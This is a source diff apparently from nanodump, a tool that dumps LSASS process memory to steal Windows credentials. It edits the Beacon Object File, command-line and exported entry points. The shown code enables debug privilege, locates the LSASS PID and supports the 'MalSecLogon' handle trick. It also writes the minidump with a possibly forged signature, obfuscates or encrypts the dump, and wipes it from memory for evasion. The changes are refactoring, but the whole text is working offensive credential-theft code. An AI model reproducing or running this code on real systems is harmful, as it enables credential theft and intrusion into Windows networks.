@@ -1,5 +1,9 @@
-#include "nanodump.c"
 
+#ifdef BOF
+ #include "nanodump.c"
+#else
+ #include "nanodump.h"
+#endif
 
 #if defined(NANO) && defined(BOF)
 
@@ -14,8 +18,8 @@ void go(char* args, int length)
     BOOL    use_valid_sig;
     BOOL    success;
     ULONG32 Signature;
-    SHORT   Version;
-    SHORT   ImplementationVersion;
+    USHORT   Version;
+    USHORT   ImplementationVersion;
     BOOL    get_pid_and_leave;
     BOOL    use_malseclogon;
     LPCSTR  malseclogon_target_binary = NULL;
@@ -178,7 +182,7 @@ void go(char* args, int length)
     }
     if (!success)
     {
-        erase_dump_from_memory(&dc);
+        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
         if (write_dump_to_disk)
             delete_file(dump_path);
         return;
@@ -190,7 +194,10 @@ void go(char* args, int length)
     );
 
     // at this point, you can encrypt or obfuscate the dump
-    encrypt_dump(&dc);
+    encrypt_dump(
+        dc.BaseAddress,
+        dc.rva
+    );
 
     if (write_dump_to_disk)
     {
@@ -208,7 +215,7 @@ void go(char* args, int length)
             dc.rva
         );
     }
-    erase_dump_from_memory(&dc);
+    erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
 
     if (!success)
     {
@@ -254,8 +261,8 @@ int main(int argc, char* argv[])
     BOOL    duplicate_handle = FALSE;
     LPCSTR  dump_path = NULL;
     ULONG32 Signature;
-    SHORT   Version;
-    SHORT   ImplementationVersion;
+    USHORT   Version;
+    USHORT   ImplementationVersion;
     BOOL    success;
     BOOL    use_valid_sig = FALSE;
     BOOL    get_pid_and_leave = FALSE;
@@ -368,15 +375,17 @@ int main(int argc, char* argv[])
         }
     }
 
+    if (!full_dump_path.Length && !get_pid_and_leave)
+    {
+        usage(argv[0]);
+        return -1;
+    }
+
     if (use_malseclogon && !duplicate_handle && !is_full_path(dump_path))
     {
         PRINT("If MalSecLogon is being used locally, you need to provide the full path: %s", dump_path);
         return -1;
     }
-
-    success = enable_debug_priv();
-    if (!success)
-        return -1;
 
     // if not provided, get the PID of LSASS
     if (!lsass_pid)
@@ -414,6 +423,10 @@ int main(int argc, char* argv[])
         PRINT("The option --binary can only be used with --malseclogon and --dup");
         return -1;
     }
+
+    success = enable_debug_priv();
+    if (!success)
+        return -1;
 
     if (use_malseclogon && !malseclogon_target_binary)
         malseclogon_target_binary = argv[0];
@@ -535,7 +548,7 @@ int main(int argc, char* argv[])
     }
     if (!success)
     {
-        erase_dump_from_memory(&dc);
+        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
         delete_file(dump_path);
         return -1;
     }
@@ -546,7 +559,10 @@ int main(int argc, char* argv[])
     );
 
     // at this point, you can encrypt or obfuscate the dump
-    encrypt_dump(&dc);
+    encrypt_dump(
+        dc.BaseAddress,
+        dc.rva
+    );
 
     success = write_file(
         &full_dump_path,
@@ -554,7 +570,7 @@ int main(int argc, char* argv[])
         dc.rva
     );
 
-    erase_dump_from_memory(&dc);
+    erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
 
     if (!success)
     {
@@ -585,8 +601,8 @@ BOOL NanoDump(void)
     /***************************************************/
 
     ULONG32 Signature;
-    SHORT   Version;
-    SHORT   ImplementationVersion;
+    USHORT   Version;
+    USHORT   ImplementationVersion;
     BOOL    success;
     wchar_t wcFilePath[MAX_PATH];
     UNICODE_STRING full_dump_path;
@@ -639,13 +655,16 @@ BOOL NanoDump(void)
     success = NanoDumpWriteDump(&dc);
     if (!success)
     {
-        erase_dump_from_memory(&dc);
+        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
         delete_file(dump_path);
         return FALSE;
     }
 
     // at this point, you can encrypt or obfuscate the dump
-    encrypt_dump(&dc);
+    encrypt_dump(
+        dc.BaseAddress,
+        dc.rva
+    );
 
     success = write_file(
         &full_dump_path,
@@ -653,7 +672,7 @@ BOOL NanoDump(void)
         dc.rva
     );
 
-    erase_dump_from_memory(&dc);
+    erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
 
     if (!success)
     {
